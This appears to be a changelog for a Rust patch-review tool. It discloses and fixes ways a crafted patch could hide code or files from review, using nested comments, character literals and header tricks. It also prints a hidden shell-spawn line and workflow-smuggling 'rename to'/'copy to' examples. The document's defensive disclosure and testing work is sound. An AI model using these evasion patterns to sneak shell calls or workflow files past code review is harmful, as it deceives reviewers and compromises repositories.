  - *One reading at a time (IR6-L-2).* A text's readings are made, read and dropped one
    after another, and what is kept between them is what they found. On the review's inputs
    (CPU seconds and peak memory, release builds; round 12, round 13, now): 999,000
    one-byte lines below line 1, 0.74 s and 158 MiB, 0.81 s and 388 MiB, 1.23 s and 212 MiB;
    a 60.9 MB fragment with an item on every line, 2.33 s and 328 MiB, 3.47 s and 626 MiB,
    4.34 s and 404 MiB; the same as a created file, 2.33 s and 328 MiB, 2.23 s and 381 MiB,
    3.09 s and 373 MiB. Memory is within a third of round 12's on every input (round 13: up
    to 2.4 times).
  - *Measured, against round 13.* On 177,957 fragments cut from 13,779 real crate files,
    cut two ways. One hunk a section (no join): the 93 real items round 13 lost against
    round 12 are all found, nothing is lost, and 26 false items are new (24 from the wider
    condition for the reading from inside a string, none from the raw-string reading, 2
    from the reading of release 0.8.3). As first cut, several hunks of added lines a file
    (which Git and now this version also read together): nothing is lost either, the same
    93 and 26, and the joins add 17 items: 10 real (`#[cfg_attr(…, ignore = …)]` written
    over several lines and cut by a hunk boundary, which only the joined text shows) and 7
    false (the further starts of a joined text: 5 from inside a string, 2 from inside a raw
    string). On 25,208 fragments with their true starts known (the sixth
    review's set): 0 misses in every start where round 13 had 20, all in fragments that
    begin in a raw string; 37 added items where round 13 had 35. On the 481 commits of this
    repository: 31 new items, one of them real (`json.rs:517`), 21 from the reading from
    inside a string and 9 from the reading of release 0.8.3; nothing lost. On 603 crates
    read as created files: 148 new items, all from the reading of release 0.8.3 and all
    text of strings and comments (of the 164 such items that round 13 had removed against
    round 12, the ones of that release's signals). Of 347 earlier reproduction patches 24
    change: 22 gain what a review asked for, one gains back two false items (`union-fp`),
    and one loses an item by the rule for the top of a file (`asym.patch`, above).
    Time is not what it was: the reading of release 0.8.3 costs about what that release's
    scan did, and a fragment has more readings. The review's ten inputs take 1.2 to 1.7
    times round 13's CPU time, and of thirty-four hostile units of two megabytes the slowest
    takes 1.4 s where it took 0.65 (900,000 lines of `"` below line 1; 700,000 lines of
    `"#`, which get every reading, take 1.4 s where they took 0.5). The cost is linear as
    before: a side of a text has at most five readings, a Rust hunk one more as release
    0.8.3 read it, and a hunk stands in at most three texts. A file written as 330,000
    hunks that are joined is read hunk by hunk and as its runs: created in that many hunks,
    as that many hunks of added lines only, and as that many hunks whose positions say they
    touch, 18 to 20 MB each, it takes 1.4, 1.35 and 1.8 times round 13's CPU time (3.5, 3.3
    and 4.6 s on a busy host where round 13 took 2.4, 2.5 and 2.6) and 1.6, 1.6 and 1.9
    times its memory (252, 260 and 324 MiB where it took 161, 162 and 173). The same
    number of hunks apart from each other cost what they cost in the first build of this
    round (measured side by side).
  - *Limits that remain, declared, each as what it is.* A side that began inside a string
    and that, read from code, carries nothing over a line end (`"; call(); // "`): it takes
    a writer who sets out to; reading every fragment from inside a string would close it
    for 457 false items on the fragments and 212 on the history (3.8% of its items), and
    still would not close the next. A side that began two or more block comments deep is
    read as one deep, and that reading can hide later code: the sentence "earlier than the
    compiler does and never later" was false (VD3R13-M-1, IR6-L-1: `// */ //`, then
    `// */ call(); /*`) and is gone from the code and the README, and marked in the entry
    before this one. A raw
    string whose own text holds a quote followed by `#`, or one opened with no `#` whose
    closing quote follows a backslash. Two hunks that touch while the old position of the
    second says they do not: Git finds a hunk by its context wherever its header says it
    is (`@@ -40,1 +41,2 @@` "succeeded at 5 (offset -36 lines)"), and a construct cut in
    two by such a pair is read in two halves. Two hunks that do touch, behind an earlier
    hunk whose position falsely says it touches the first of them, are read together only
    with that hunk in front. A hunk whose old position is 1 and that holds old lines is the
    top of its file to plain `git apply`, which refuses it anywhere else, and is read so and
    in no other way; `git apply --unidiff-zero` puts it lower when its old lines are lower
    ("succeeded at 5 (offset 4 lines)"; `-C0` too, for a hunk that begins with a context
    line). For hunks with no old line, which is what a `-U0` patch of added lines has, the
    reading of every hunk alone covers the applier that believes positions. None of the 25,208 fragments with known
    starts shows the first two. A suppressed lint is still read on one line (IR6-L-4): the
    four spellings the review gives are declared misses, not code, in this round. Editions
    before 2021, frontmatter and characters after Unicode 18: as in the entry before this
    one (a spawn in one text of the older editions is now found, by the reading of release
    0.8.3).
  - *Tests.* Unit tests hold the top rule in both directions of a false header, the texts of
    a file (every hunk alone, certain joins, joins on the word of positions, hunks out of
    order), that a join takes no reading away (the two hunks above, and `@@ -1,0 +N @@`
    read both ways) and the same as a property over 1,500 generated files cut four ways
    (what a hunk gives alone is among what its file gives for it), every review reproduction as an assertion (`lie1` to `lie3`, `split2`, `split4`,
    the three `newfile-depth` forms, `snap2`, `oldstr-both`, `strcmt`, `rawbs`, `glob-git`,
    `apos-git`, `newfile-string-depth`), the full-context forms of four declared misses,
    the labels of joined hunks in the graph and in the daemon's views, and, on 3,000
    generated texts as a created file and as a fragment, added and removed, that nothing
    release 0.8.3 reports is lost. The test that held the miss of IR6-H-2 as its expected
    answer asserts the finding. A new fuzz target, `rust_hunk_places` (IR6-L-3), builds a
    whole Rust file whose every line is in a known state and requires that the same change
    written in other ways Git accepts loses no item: the file created as several hunks with
    honest or false headers, a hunk cut out with the lines above and below unseen whatever
    the cut left open, the same hunk with another new position, and what the scanner and
    rules of release 0.8.3 find on any text; and that no join takes a reading away (what each
    hunk gives as a patch of its own is among what the file gives for it, for a creation in
    several hunks and for hunks of added lines apart in an existing file). Its ten seeds
    hold. Nine of them fail on the sources of the commit before (`8f290e3`); the tenth,
    the two hunks above, holds there and fails on this round as first built. Rule 5 of `rust_tokens` (a comment between
    two tokens and strings on earlier lines change nothing) now asks of a hunk below line 1
    that no signal is lost, where it asked for the same set: the further readings of a
    fragment can add a signal from the text of a comment or a string, which is their
    declared cost; in a created file the set must still be the same. The corpus has 49 cases (new:
    `evidence/independent-review-6-20261114`, seventeen items, three declared false positives
    and eight declared misses; one declared miss of the case before it is found): evidence
    precision 134 of 153 (was 116 of 132), recall 134 of 187 (was 116 of 162), 75 declared
    (was 65). Precision fell a little, on purpose: two of the three new false positives are
    items release 0.8.3 reports. Recall rose a little, though four of the eight new misses
    are spellings of a suppressed lint that no rule reads yet.
  - *The bounded list keeps what release 0.8.3 listed (review of the same change on the
    released line, VLF3-L-1).* `rank.v0` lists at most 32 items a file, and they were the
    first 32 of all items. An item only this version finds, on an earlier line, pushed out
    one that release showed: far more often here than on the released line, since the
    signals this branch adds do it on ordinary history (a test file of this repository
    spawns processes at five places and listed four of them, after the panic paths of its
    tests took the rest of the room; on 2,990 patch files, 238 of the 620 files with more
    than 32 items lacked an item that release listed). Score and signals were right and
    `evidence_truncated` said so, but a reader of the list saw a spawn less than before.
    The bound stays 32. The list now holds, while there is room: first the items release
    0.8.3 listed, in its order (an item carries whether that release reported it: for Rust
    what the reading of that release finds, for another language a signal it had, found in
    the hunk read alone); then the first item of every signal with no item in the list yet,
    the heavier signal first; then the others as they come. It is printed in the file's
    order (hunk, line, signal) as before, and a file with 32 items or fewer prints what it
    printed. Three orders for the items after the release's were measured on those 620
    files. As they come: 189 files have a signal with no item in the list. The heavier
    signal's items first: the same list in every one of the 620 (nearly all weights are 3).
    A place for every signal first (taken): 180 such files, a different list in 9, each a
    crate's file in which `test_skipped`, `stub_added` or `error_swallowed` gains its place;
    on this repository's history the three give the same lists. In 177 of the 620 the
    release's items fill all 32 places and a newer signal has no item in the list under any
    order that keeps them (none on this repository's history): it is in `signals`, and the
    list says it is cut short. Raising the bound would move that, not end it, and is not
    done. The CLI and the daemon (and so MCP) take the list from one function
    (`RankedFile::scored`); the views that show one hunk's labels are not bounded. Checked
    against the published 0.8.3 binary on the 2,990 patch files, comparing every listed
    item also where a list is cut short: no patch has an item that release lists and this
    version does not (the same comparison finds 193 such patches for round 13's binary).
    Tests: at the level of the rank, an item of a newer signal, and one of a newer reading,
    on line 1 above 32 spawns (all 32 are listed); forty panic paths and a stub; the heavier
    of two signals for the last place; and as a property over 1,200 generated files in Rust
    and Python with many items, created in one hunk, in several, and changed by hunks of
    added lines, that the items marked are exactly that release's, that what it printed is
    printed, that the list is in the file's order and as long as the bound allows, and that
    every signal has a place where there is room. Each fails under its control (the first
    32 again; no place kept for a signal; no weight; a mark by signal alone; no mark).

### Changed

- **`basis` in `rank.v0` evidence is no longer always `lexical`.** An item carries the highest
  rung that found it: `"hunk"` when a rule read a neighbouring line, `"syntax_fragment"` when
  the parser read the construct. An item only a token finds is unchanged. The set of values
  grows: a client that compared it with `lexical` should accept other values. *Superseded
  before release: the values are `lexical` and `hunk`; `syntax_fragment` was never released
  and is gone with the parser. `hunk` now also marks a Rust construct whose tokens stand on
  several lines.*
- **A hunk's evidence can depend on the hunks Git must put beside it.** A file created as
  several hunks, a hunk of added lines after one that ends its file, and hunks whose old
  positions say they touch are read as one text, and an item is reported in the hunk and on
  the line it stands in. For a patch `git diff` writes nothing changes: every hunk is a text
  of its own. The graph crate gains `joined_hunks` (the hunks of a file that are read with
  another) and `hunk_signals_alone` (the scan of a hunk that is a text of its own);
  `hunk_signals` answers for any hunk, at the cost of the texts it stands in.
- **Every Rust hunk is also read as release 0.8.3 read it**, so a version after this one never
  reports fewer items of that release's signals than the release did. Items of those
  signals that the release reported in the text of a string or a comment, which rounds 12
  and 13 had stopped reporting, are reported again.
- **Existing Rust signals can be found where they were not before.** `test_skipped`,
  `trivial_assert` and `stub_added` in a Rust hunk are now also found by the parser, so a
  spelling the tokens missed is reported and raises the file's score. *Superseded before
  release: they are found by reading the hunk's tokens across its lines, not by a parser;
  `test_removed` is read the same way, so a removed `#[tokio::test(flavor = "…")]` or a
  `#[test]` written over lines is reported.*

### Security

- **A construct cut in two by a hunk boundary, or a comment carried over one, is read as Git
  applies it** (sixth independent review of the integrity signals, IR6-H-3; in releases up to
  0.8.3 too). Every hunk was read alone. Plain `git apply` accepts a file created as several
  hunks, and a hunk of added lines after one that ends an existing file, and puts them one
  straight after the other: a block comment opened in the first hunk hid a
  `std::process::Command::new` in the second from `process_spawn` (the same for `unsafe`
  and a network call), and a call whose name ended one hunk and whose `()` began the next
  left no item. Hunks Git must put together are now one text. And a hunk header's NEW
  position is no longer believed (IR6-H-1; the readings it switched off are not in a
  release). Details and what stays open are in the Testing entry for round 13.
- **Rust code after a nested block comment, or after a character literal with a long escape,
  was hidden from every Rust rule** (second and fourth independent reviews of 2026-11-14,
  IR2-H-3 and IR4-H-1; both reproduced on the released v0.8.3 binary with a control). Every
  Rust rule reads a view of each line in which comments and literals are blank. That view
  misread two things the compiler reads plainly, and what it took for a comment or a string
  left no evidence: not `process_spawn`, `network_fetch`, `dynamic_eval` or `unsafe_added`,
  and none of the integrity signals above.
  - *Block comments.* Rust nests them. The view ended a comment at the first `*/`, so after
    `/* /* */` a `//` cut the line where, for the compiler, the comment is still open and the
    code behind its last `*/` runs:
    `/* /* */ // */ std::process::Command::new("sh").arg("-c").arg(u).status().ok();`
    was ranked as a line with no signal (v0.8.3: score 2, no signal; the same call written
    plainly: `process_spawn`).
  - *Character literals.* The view knew a literal by a closing quote two bytes on, or three
    after a backslash. After `'\x41'`, `'\u{1F600}'` or any longer escape it was one quote
    out of step: in `('\x41','"', "/*")` it took the `"` of `'"'` for the start of a string
    and the `/*` of the real string for a comment that nothing closed, and the rest of the
    hunk was blank (v0.8.3: no `unsafe_added` for an `unsafe` block under that line).
  - *Since when.* Both readings are as old as the view: every release that has it, 0.5.0 to
    0.8.3. Other languages are not affected: JavaScript, Go and C-like comments do not nest,
    and no other language here has this form of literal.
  - *The fix.* The Rust view no longer has rules of its own. It follows the compiler's lexer
    (`rustc_lexer`) token by token, with that lexer's rule for where each token ends: block
    comments nest, to any depth and over lines; a character or byte literal is read whole,
    whatever its escape; a `'` before a name is a lifetime or a label; strings, byte strings
    and C strings, and raw strings with any number of `#`, end where the lexer ends them, on
    one line or over several; `r#fn` is a name; a literal's suffix and a number take the
    letters that belong to them, so an `r` or a `b` before a quote is a prefix only where
    the lexer says so; names past ASCII are read with the lexer's own tables (Unicode
    18.0.0). Where an edition decides, the view takes edition 2021 and later (`cr"\"` is a
    raw C string). What the lexer calls unterminated, and what it closes as a character
    literal that no compiler accepts (`'ab'`, one over a line end), is passed over whole
    and kept as text. The rule that a hunk may start inside a string stays: once a string
    has run over a line end, the lines after it are read both ways and what either reading
    finds code is code. One reading, the one that resumes every such string, is the
    compiler's for text that starts in code; it is now kept apart and never dropped, however
    many others there are. (A view that counts comment depth can pile up more readings than
    it keeps: the oracle found a compiling text on which that one was dropped while this was
    written.) Python, JavaScript and TypeScript, Go, shell and YAML are read exactly as
    before.
  - *How it is held.* A fuzz target, `rust_code_view`, compares the view with the compiler's
    lexer itself (`ra-ap-rustc_lexer` 0.184.0, a dependency of the fuzz crate only) for any
    text read as a file from its first line: every byte of a token that is code must stand
    unchanged in the view, and where the view has one reading, every byte of a comment and
    of a closed literal's text must be blank. One seed runs the comparison for every
    character past ASCII, so the view's tables cannot fall behind the lexer's unseen. Unit
    tests hold each rule above with what the compiler does, checked with rustc 1.99.1 in
    editions 2015 to 2024. The corpus has 47 cases: `evidence/rust-code-view-20261114` holds
    both hiding lines before a released signal each and before the integrity signals
    (fourteen items, all expected), and the two calls after `/* /* */ // */` that were
    declared misses are found (evidence precision 97 of 111, was 81 of 95; recall 97 of
    139, was 81 of 125; 59 declared, was 61).
  - *What changes for a reader of `rank.v0`.* Rust code that was hidden is evidence now, so
    a file can rank higher than it did. A character literal with a long escape or of several
    bytes (`'\u{2028}'`, `'é'`) is blank where it was shown. Nothing else in the output
    changes.
  - *Limits that remain.* A hunk that starts inside a string or a block comment is read as
    code from its first line, as before. A shebang line, which the compiler skips, is read
    as Rust. Before edition 2021 `cr"\"` is a name and an ordinary string; the view reads the
    newer form. These known limits of the entries above are closed: the call after
    `/* /* */ // */` (in plain code and in another macro's body) and the wrong `test_likely`
    after `/* /* */ " */`.
  - *Changed since (round 13, the last entry under Testing above).* A view is no longer a
    union of readings: a side of a hunk is read as whole views, each from one stated start,
    and their findings are united. The first two limits above are closed or narrowed there
    (a hunk that starts inside a block comment, or inside a string its quotes betray; a
    shebang line), and the limits that remain are listed there with their measured counts.

## [0.8.3] - 2026-11-11

Tagged `v0.8.3` at `a74bf91` (2026-11-11 UTC), signed.

**Security release** ([GHSA-rq5r-p3g9-phff](https://github.com/Louranicas/deep-diff-forge/security/advisories/GHSA-rq5r-p3g9-phff)). v0.8.2 and earlier could review a
change on a different file, or with a different mode or type, than `git apply` writes: a
name left behind by a `diff --git` line that a binary line follows directly, a new file's
mode overridden by a `new mode` line (independent rescore of v0.8.2, F3 high, F2 medium),
and content under a mode Git reads as a submodule (found while the fix was reviewed, high).
Upgrade from 0.8.2; the changes are fixes and three dependency updates, and no interface
changes. Three findings of the same rescore are not fixed here and are listed under Known
limits.

### Security

- **No name carries over from a `diff --git` line Git reads no patch from** (independent
  rescore of v0.8.2, F3, high). A `diff --git` line with no extended header after it is no
  header to Git, so `Binary files … differ` or `GIT binary patch` straight after it is no
  patch. But the line has already given Git's patch its names, and they stay for the next
  section that has no `---`/`+++` or move names of its own. `diff --git a/first b/first`,
  `Binary files a/first and b/first differ`, then `diff --git a/second b/second` with an
  `index` line and a hunk was reviewed as a binary change to `first` and a text change to
  `second` (exit 0), while `git apply` wrote the hunk to `first` and left `second` alone.
  Measured on v0.8.2 with Git 2.56. A binary line straight after `diff --git` is now refused
  (exit 4); Git writes an `index` line before it.
- **A created or deleted file's mode is not overridden by `old mode` or `new mode`** (rescore
  F2, medium). `new file mode` and `new mode` set the same mode in Git and the later line
  wins, so `new file mode 100644` followed by `new mode 120000` created a symlink, and
  `new mode 100755` an executable, where the review showed a plain new file with both lines
  in its metadata. `new file mode` or `deleted file mode` beside `old mode` or `new mode` is
  refused, in either order. Git never writes the pair.
- **A mode Git reads as a submodule cannot carry content** (found while this fix was
  reviewed; high). Git reads a mode with no file-type bits as a submodule (`canon_mode`), and
  for a submodule it makes or removes a directory and writes nothing from the hunks.
  `new file mode 644` (or `755`, `0`, `140000`) with a hunk, and `new file mode 160000` with
  a hunk of ordinary content, were reviewed as a new file holding that content, while
  `git apply` created an empty directory. A binary body under `160000` was shown as a binary
  change and written as an empty directory too. Measured on v0.8.2 with Git 2.56. A mode on
  a mode header or an `index` line must now have the type of a regular file, a symlink or a
  submodule. Under a submodule mode every hunk line must be Git's own
  `Subproject commit <id>`, and a binary line or body is refused.

### Fixed

- **The Git differential puts one section's leftovers in front of another.** Its generated
  cases were single sections, so a name left by an earlier line was never in play. A bare
  `diff --git` line, one of 23 lines (the extended headers, header breaks and binary body
  lines), then each of five sections (115 cases) is now compared with `git apply`, beside the
  findings themselves. Its summary comparison now includes the mode a file is created or
  deleted with, which it dropped before: a symlink or an executable is created by its mode
  alone. Control: the new tests fail on the v0.8.2 parser.
- Twelve test fixtures in eleven files used `diff --git` followed directly by `Binary files …
  differ` as "a binary file". They now have the `index` line Git writes.

### Dependencies

- **unicode-width 0.2.3, rustix 1.1.6 and signal-hook 0.4.6** (Dependabot #112, applied as
  #120 with `fuzz/Cargo.lock` and the SBOM in step; the fuzz lock's rustix moves from 1.1.4
  to 1.1.6 too). Read from the crates' sources, not measured:
  - unicode-width 0.2.3 gives U+FF9E and U+FF9F (the halfwidth katakana voiced and
    semi-voiced sound marks) width 1, where 0.2.2 gave 0, and moves its tables to Unicode 18.
    Padding and wrap points change for text with those two characters; no DDF test or fixture
    has them. unicode-segmentation stays at 1.13.3 (Unicode 17).
  - rustix 1.1.6 carries the fix for GHSA-jh2m-fhpj-3vr7 (RUSTSEC-2026-0486: extended-attribute
    calls, 1.0.0 to 1.1.5). DDF calls none of them, so no DDF release was affected; the
    advisory entered the RustSec database on 2026-11-11, and from then the supply chain gate
    of CI and of the release workflow refuses a lock file with rustix 1.0.0 to 1.1.5 (the
    root lock had 1.1.5, the fuzz lock 1.1.4). That is why a security release carries dependency
    updates.
  - signal-hook 0.4 changes `low_level::pipe`, which DDF does not use; the daemon's
    `iterator` use is unchanged. The TUI's crossterm still brings signal-hook 0.3.18, so the
    CLI links both, over one signal-hook-registry.

### Known limits (from the same rescore; not fixed here)

- **A binary body Git finds corrupt (F1, medium).** Git checks a `GIT binary patch` body by
  inflating it; DDF checks its line grammar only. When the body does not inflate, Git prints
  an error, applies the sections before it, drops that section and every later one, and
  exits 0, while DDF shows them all as changed. Nothing unreviewed is written, but reviewed
  changes do not land.
- A mail-format patch whose message has a line beginning `-` or `+` is refused though Git
  applies it (F4), and `--layout inline` does not show modes, symlinks or a rename's source
  (F5).

## [0.8.2] - 2026-11-09

Tagged `v0.8.2` at `fb5ffe1` (2026-11-10), signed.

**Security release** ([GHSA-gp5v-m67f-gmgp](https://github.com/Louranicas/deep-diff-forge/security/advisories/GHSA-gp5v-m67f-gmgp)). v0.8.1 and earlier could
review a different file or mode than `git apply` writes: a copy under a name other than its
`copy to`, a Git section whose `---`/`+++` name `-p1` leaves nothing of, repeated mode
headers (independent rescore of v0.8.1, N1 and N2 high, N3 medium), a copy, rename or mode
line after a binary line, and a move name with a carriage return in it (rescore of the
untagged 0.8.2, F1 high, F2 medium). Upgrade from 0.8.1; every change below is a fix, and no
interface changes.

### Security

- **A copy's reviewed destination is the one Git writes** (independent rescore of v0.8.1, N1,
  high). Git takes a copy's new path from its last `copy to` line; DDF never read that line and
  reviewed the `diff --git` or `+++` name instead. `diff --git a/README.md b/docs/README-copy.md`
  with `copy to .github/workflows/pwn.yml` and a hunk was reviewed as a docs copy (exit 0, CLI,
  `rpc` and MCP `review_outline`) while `git apply` wrote the workflow with the hunk's content.
  Present since `copy` headers were first read; measured on v0.8.0 and v0.8.1 with Git 2.56.
  The last `copy to` is now the reviewed path, as Git reads it.
- **A Git section's `---`/`+++` name that `-p1` leaves nothing of is refused** (rescore N2,
  high). Git reads `--- README` as no name and keeps the `diff --git` one, so
  `diff --git a/.github/workflows/ci.yml …` with `--- README` / `+++ README` changed the
  workflow while DDF reviewed `README`. No tool writes this form; it is refused (exit 4).
- **A binary line ends a Git section's header** (independent rescore of `af5c3d1`, the
  untagged 0.8.2, F1, high). Git stops reading extended headers at `Binary files … differ` and
  `GIT binary patch`, and its patch for the section ends there. DDF read on, so
  `diff --git a/.github/workflows/ci.yml …` with an `index` line, `Binary files … differ`, then
  `copy from docs/logo.png` / `copy to docs/logo-copy.png` was reviewed as a binary copy of a
  logo (exit 0, CLI and MCP `review_outline`) while `git apply` rewrote the workflow from the
  `index` line's blob, which only has to be in the object database. A `rename` after the binary
  line did the same in v0.8.1; the N1 fix above made the copy form hide the workflow path too.
  A header, `---`/`+++` or hunk after a binary line is now refused, as are `GIT binary patch`
  with trailing text, `Binary files` without `differ`, and a `GIT binary patch` with no
  `literal` or `delta` line, which Git refuses.
- **A move name with a carriage return in it is refused** (same rescore, F2, medium). Git reads
  an unquoted `rename to`/`copy to` name only up to a carriage return (or vertical tab or form
  feed), so `rename to build.rs\rdocs/notes.md` created `build.rs` while the review showed the
  whole line with a control-character hazard but no build-script signal. Git quotes such names,
  so an unquoted one is refused (exit 4).
- **A repeated mode header, or an `index` mode beside a mode header, is refused** (rescore N3,
  medium). Git keeps the last of each, and reads an `index` line's mode as the old mode, so
  `old mode 100755` / `new mode 100755` / `index … 100644` made a script executable while DDF,
  reading the first, showed no mode change. Git never writes either form.
- **What Git refuses as inconsistent is refused**: a section that is both a rename and a copy, a
  `+++` that differs from the `rename to` or `copy to` name, a new file's `+++` or a deleted
  file's `---` that differs from the `diff --git` name, and a second `---`/`+++` pair before a
  Git section's first hunk (rescore L2 and oracle mutants). Each was reviewed as a change that
  never applies.
- Test: `no_duplicated_or_copy_header_mutant_reads_differently_from_git`. The `git apply` oracle
  now compares `--summary` as well as `--numstat`: copies and the paths they write, created and
  deleted files, and mode changes. The test asserts the findings, then inserts each kind of
  extended header, a duplicate mode, an `index` mode, `copy to`, a nameless `---`/`+++` and a
  mismatched name at every position of five Git sections; each case must be refused or read
  exactly as Git reads it. Control: it fails on the v0.8.1 parser at N1.
- Test: `no_header_after_a_binary_line_or_control_in_a_move_name_is_read`, with binary lines and
  control-character move names added to the inserted headers. Control: both tests fail on
  `af5c3d1`. The refusal message for contradictory headers now names repeated modes and
  rename-and-copy, not only a new or deleted file.

## [0.8.1] - 2026-11-07

Tagged `v0.8.1` at `d290379` (2026-11-08), signed.

**Security release.** v0.8.0 reviewed a rename to a different destination than `git apply`
writes when a line Git does not read as a header (a blank line, any text) came between two
`rename to` lines (independent rescore of v0.8.0, F1, high). Upgrade from 0.8.0; every change
below is a fix or an addition, and no interface changes.

### Added

- **Every council result names its schema** (low-severity finding of the 2026-11-04
  assessment). `council review`, `status`, `gate` and `import` printed JSON with no `schema`
  field, so a consumer could not tell a changed shape from a broken one. They now carry
  `deep-diff-forge.council-<command>.v1`; `gate` stays an array and each result in it carries
  the field. The field is added, nothing is removed or renamed. `prepare`, `export-tuicr` and
  `import-tuicr` already named theirs and are unchanged. Test:
  `every_council_result_names_its_schema` (fails on the old CLI: `review` had no schema).
### Fixed

- **A signal stops the daemon even when its socket path is gone, and a second signal ends the
  drain** (low-severity findings of the 2026-11-04 assessment). A stop woke the accept loop by
  connecting to the socket path, so once the path was removed the daemon waited for a client
  that could no longer arrive. The loop now polls the listener together with a private socket
  pair that a stop writes to; the listener is non-blocking, and an accepted socket is made
  blocking again (macOS passes the mode on). A second SIGTERM or SIGINT during the drain was
  ignored; it now exits at once with 128 plus the signal's number, after removing the socket
  if it is still this daemon's. Tests: `a_signal_stops_the_daemon_after_its_socket_path_is_gone`
  and `a_second_signal_during_the_drain_exits_at_once`; both fail on the old daemon (measured).
  `an_idle_daemon_uses_no_cpu` keeps the loop waiting in `poll`: without the wait it spins on
  the non-blocking listener (1.86 s of CPU in 2 s idle).
### Security

- **A rename's reviewed destination is the one Git writes** (independent rescore of v0.8.0,
  F1, high). Git ends a `diff --git` section's extended header at the first line it does not
  read as one (a blank line, any text) and at a last line with no line feed; DDF read on. So
  `rename to .github/workflows/pwn.yml`, a note, then `rename to docs/harmless.md` was reviewed
  as a harmless docs move (exit 0, through the CLI, `rpc` and MCP) while `git apply` installed
  the workflow. Measured on v0.8.0 with Git 2.56. After the header ends, a header line or a
  `---` is now refused (exit 4), and so is a header line with no line feed.
- **A Git section's `---`/`+++` after its header ended is refused** (rescore F2). Git reads that
  pair as a new, traditional patch: `--- a/too<TAB>.py` after a blank line made Git modify `too`
  while DDF reviewed a rename of `tool.py`.
- **`+++ /dev/null` in a Git section needs `deleted file mode`** (rescore F3), and `--- /dev/null`
  needs `new file mode`. Without it Git deleted the old file and also created one named
  `dev/null`, which the review did not show. The rendering of a traditional diff's added or
  deleted file now carries the mode line Git implies (`100644`), so it still reparses.
- **A traditional new or deleted file must only add or only remove lines**, as with a mode line.
  Git refuses one that does not ("new file depends on old contents", "deleted file still has
  contents"); DDF accepted it. Found by fuzzing this branch; the input is a regression fixture.
- Test: `no_extended_header_mutant_reads_differently_from_git` asserts the findings against
  `git apply --numstat`, then breaks every extended-header position of four Git sections with a
  blank line, a note or `---`, followed by each kind of late header; each case must be refused
  or read exactly as Git reads it. Control: it fails on the v0.8.0 parser at F1.
- **A release is built only from a tag on `main`** (low-severity finding of the 2026-11-04
  assessment). The release workflow already refused a tag not signed by an allowed key; a
  correctly signed tag on a commit that never reached `main` was still released. The
  supply-chain gate now passes `main`'s commit to `scripts/verify_release_tag.sh`, which refuses
  a tag whose commit is not an ancestor of it, and checks out full history for that. Measured:
  the old script verified such a tag (`repo_scripts.rs` control). A branch that also edits
  `release.yml` can still drop the check; `RELEASE_AND_PUBLICATION.md` says so.

## [0.8.0] - 2026-11-06

Tagged `v0.8.0` at `dd1aa89` (2026-11-07 local time; 2026-11-06 UTC), signed.

**Breaking.** 0.8.0 is a minor release because it changes contracts 0.7.0 callers rely on:
`PatchParseError` gains four variants (`MisplacedHunk`, `LossyHeader`, `HunkWithoutChange`,
`SectionWithoutPatch`) and is now `#[non_exhaustive]`; patches Git refuses or reads differently
are refused (exit 4) instead of reviewed; and non-UTF-8 input exits 3 where some commands
exited 4. Each is listed below.

### Security

- **A client that reads slowly can no longer hold the daemon's read budget** (production
  readiness 2026-11-04). A request's bytes stayed reserved until its answer was written, and
  `SO_SNDTIMEO` bounded each write call, not the response, so two clients that read a byte every
  29 s held the whole 160 MiB budget and every other request was refused busy. The bytes now go
  back once the answer is ready, and each response must be read within 30 s of its first byte
  (`write_line_within`; every response and refusal is written through it). The write is
  non-blocking: the deadline is checked before every write call, and each wait for space is a
  `poll` bounded by the time left. A blocking write cannot give that bound, because
  `SO_SNDTIMEO` restarts for each buffer the call waits for (measured):
  - one 2 MB write to a client reading 128 KiB every 300 ms ran seconds past an 800 ms limit on
    Linux;
  - 64 KiB writes with the timeout re-armed between them still did on macOS (PR #101 CI), whose
    Unix socket send buffers default to 8 KB.

  The tests' controls catch the single write, the 64 KiB writes (a 4 KB send buffer models
  macOS: 1.50 s past a 500 ms limit) and the budget held through the write.
- **Every child process DDF waits for has a deadline and capped output.** `tuicr` (120 s, 32 MiB)
  and the council's Git calls (120 s, the caller's cap) waited without either. Both now run
  through `deep_diff_forge_core::process::run_bounded`, which kills and reaps a child past its
  limits without waiting on a grandchild that holds its pipes. `clippy.toml` disallows the
  unbounded waits (`Command::output`, `Command::status`, `Child::wait`,
  `Child::wait_with_output`) outside a reviewed door.

### Added

- **`findings verify --require-findings`** refuses (exit 7) a findings file that holds no
  findings. `--require-all` holds for an empty file, so a gate on it passed an agent that wrote
  nothing; a gate that needs findings adds both. `Verdict::total` counts them.

### Changed

- **Release binaries are built from one codegen unit** (`[profile.release] codegen-units = 1`).
  With the default 16, a binary built from this release's daemon and process changes, which
  touch no parser code, parsed 27% slower than `main`'s (`parse_seal`, 1.27x in CI and locally;
  identical binaries measured 1.00x). Built with one unit each, the two were within 1.01x
  (measured). `release_binaries_are_built_from_one_codegen_unit` keeps the setting.

- **Non-UTF-8 input exits 3 (`io`) everywhere**, as the exit-code registry names it: a findings
  file and an `eval` corpus file name or findings file exited 4, and an `analyze` source exited
  4 while its patch exited 3.
- **`review.change` checks its deadline between its two Git stages**, so a request overruns its
  client's deadline by one stage at most, as documented (C9), not two.
- **A malformed hunk header can no longer hide a file from the review** (production readiness
  2026-11-04). The parser trimmed the space after `@@`, so `@@-1,1 +1,1 @@` was read as a hunk of
  the current file and the `--- a/evil` / `+++ b/evil` lines after it as that hunk's body, while
  `git apply` ended the file there and wrote `evil`. Measured on v0.7.0: DDF reviewed one file,
  exit 0; `git apply` changed two. Hunk headers now follow Git's `parse_fragment_header` byte for
  byte (`@@ -` RANGE ` +` RANGE ` @@`), and any line beginning `@@` that is not one is refused.
- **A hunk is accepted only where Git reads one** (`MisplacedHunk`): right after its file's `+++`
  or a Git section's extended header, or right after the previous hunk. A hunk after a blank or
  stray line is "patch fragment without header" to Git.
- **A header line that is not UTF-8 is refused** (`LossyHeader`, exit 3), instead of being
  reviewed under a substituted name (`caf\xe9` and `caf\xe8` both read `caf\u{fffd}`). Lossy
  hunk lines and preamble are still reviewed and marked, as before.

- **Patches Git refuses or reads no patch from are refused:** a hunk that adds and removes
  nothing (`HunkWithoutChange`: Git's "corrupt patch"; it was exit 7 under `--require-hunks`, exit
  0 without), a `diff --git` line with nothing after it, and a traditional `---`/`+++` pair with
  no hunk (`SectionWithoutPatch`). Exit 4.
- **`PatchParseError` is `#[non_exhaustive]`**, so a future refusal is a new variant without
  breaking callers that match it; outside the patch crate, match with a wildcard arm or use
  `exit_code`.
- **One place decides a parse refusal's exit code** (`PatchParseError::exit_code`): the CLI, the
  structured Git selections and the daemon's domain code use it, and the Rust SDK maps daemon
  error 3 to exit 3, as the registry names it.

### Testing

- **Differential Git oracle** (`crates/deep-diff-forge-patch/tests/git_differential.rs`): for every
